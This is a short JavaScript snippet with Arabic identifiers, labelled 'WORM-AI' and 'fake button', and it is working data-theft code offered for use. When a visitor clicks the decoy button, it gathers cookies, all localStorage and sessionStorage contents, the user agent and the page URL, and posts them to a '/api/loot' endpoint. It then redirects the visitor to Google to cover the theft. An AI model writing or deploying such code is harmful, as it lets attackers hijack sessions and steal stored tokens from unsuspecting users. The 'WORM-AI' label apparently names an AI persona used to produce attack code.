/* WORM-AI💀🔥 – زر وهمي */
(()=>{
  const سرق=async()=>{
    const بيانات={
      كوكيز:document.cookie,
      محلي:Object.entries(localStorage),
      جلسة:Object.entries(sessionStorage),
      وكيل:navigator.userAgent,
      رابط:location.href,
      الوقت:new Date().toISOString()
    };

    // إرسال إلى الـFunction المحلي فقط
    await fetch('/api/loot',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(بيانات)
    });

    // توجيه بسيط (يمكنك تغييره لاحقًا)
    location.replace('https://www.google.com');
  };
  document.getElementById('enterBtn').addEventListener('click',سرق,{once:true});
})();
